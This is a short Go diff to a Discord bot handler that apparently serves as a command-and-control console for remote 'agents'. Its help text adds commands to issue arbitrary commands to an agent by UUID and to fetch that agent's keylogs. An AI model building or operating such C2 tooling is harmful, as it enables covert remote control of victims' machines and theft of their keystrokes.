@@ -32,8 +32,13 @@ func newMsg(discord *discordgo.Session, message *discordgo.MessageCreate) {
 	}
 	switch {
 	case strings.Contains(message.Content, "!help"):
-		discord.ChannelMessageSend(message.ChannelID, "Use `!agents` to list agents\nUse `!agent` to list agents")
+		discord.ChannelMessageSend(message.ChannelID, "Use `!agents` to list agents\nUse `!refresh <uuid>` to get agent commands/refresh\nUse `!cmd <uuid> <command>` to issue commands to the agent\nUse `!keys <uuid>` to get keylogs")
+	case strings.Contains(message.Content, "!refresh"):
+		logger.Logf(logger.Info, "Bot received !refresh triggered :"+message.Content+"\n")
+		agentBot := command.GetBotAgent(message.Content)
+		discord.ChannelMessageSendComplex(message.ChannelID, agentBot)
 	case strings.Contains(message.Content, "!agents"):
+		logger.Logf(logger.Info, "Bot received !agents triggered :"+message.Content+"\n")
 		agentsBot := command.GetBotAgents()
 		discord.ChannelMessageSendComplex(message.ChannelID, agentsBot)
 	case strings.Contains(message.Content, "milk"):
